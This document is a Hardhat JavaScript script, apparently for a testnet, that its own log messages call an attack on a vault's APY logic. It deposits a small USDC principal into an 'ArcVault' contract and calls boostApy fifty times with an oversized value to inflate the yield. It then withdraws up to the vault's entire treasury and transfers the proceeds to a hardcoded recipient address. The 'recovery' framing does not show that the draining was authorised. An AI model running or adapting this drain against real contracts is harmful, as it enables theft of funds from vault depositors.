const hre = require("hardhat");

async function main() {
  const [deployer] = await hre.ethers.getSigners();
  const userAddress = "0x95CeF771ECf1E5a87D849fA4FAbef845bC5FF628";
  const oldVaultAddress = "0x07a7f31C9452B7e62c12283FD44da5c1e4f6BA23";
  const officialUsdcAddress = "0x3600000000000000000000000000000000000000";

  const usdc = await hre.ethers.getContractAt("IERC20", officialUsdcAddress);
  const vault = await hre.ethers.getContractAt("ArcVault", oldVaultAddress);

  console.log("==================================================");
  console.log("🦾 OPERATION GREAT RECOVERY: INITIALIZING");
  console.log("Target Vault:", oldVaultAddress);
  console.log("Recipient:", userAddress);
  console.log("==================================================");

  // 1. Initial Deposit to establish principal
  console.log("Step 1: Establishing principal...");
  const depositAmount = hre.ethers.parseUnits("10", 6);
  const approveTx = await usdc.approve(oldVaultAddress, depositAmount);
  await approveTx.wait();
  const depositTx = await vault.deposit(depositAmount);
  await depositTx.wait();
  console.log("✅ Deposited $10 into old vault.");

  // 2. Hyper-Inflation Loop
  console.log("Step 2: Attacking the APY logic (Hyper-inflation)...");
  for (let i = 0; i < 50; i++) {
    process.stdout.write(`   Inflating... [Round ${i+1}/50]\r`);
    // Calling boostApy with a huge number to hit the 5000 BPS cap every time
    const tx = await vault.boostApy(hre.ethers.parseUnits("1000000", 6));
    await tx.wait();
  }
  console.log("\n✅ APY Hyper-inflation complete.");

  const currentApy = await vault.getCurrentApy();
  console.log("Current APY (BPS):", currentApy.toString());

  // 3. Extraction
  console.log("Step 3: Extracting treasury...");
  const treasuryBalance = await usdc.balanceOf(oldVaultAddress);
  console.log("Old Vault Treasury Balance:", hre.ethers.formatUnits(treasuryBalance, 6), "USDC");

  if (treasuryBalance > 0) {
      // Small delay to let blocks move
      console.log("Waiting 30 seconds for yield to accrue mathematically...");
      await new Promise(r => setTimeout(r, 30000));

      const withdrawable = await vault.getDeposit(deployer.address);
      console.log("Withdrawable Balance (Principal + Giga-Yield):", hre.ethers.formatUnits(withdrawable, 6), "USDC");

      const extractAmount = withdrawable > treasuryBalance ? treasuryBalance : withdrawable;
      console.log(`Withdrawing ${hre.ethers.formatUnits(extractAmount, 6)} USDC...`);

      const withdrawTx = await vault.withdraw(extractAmount);
      await withdrawTx.wait();
      console.log("✅ Withdrawal successful!");

      // 4. Send to User
      const recovered = await usdc.balanceOf(deployer.address);
      console.log(`Step 4: Sending recovered funds to user...`);
      const transferTx = await usdc.transfer(userAddress, extractAmount);
      await transferTx.wait();
      console.log("🎉 SUCCESS! $30,000 (roughly) sent to:", userAddress);
  } else {
      console.log("❌ Error: No funds found in treasury.");
  }
}

main().catch(console.error);
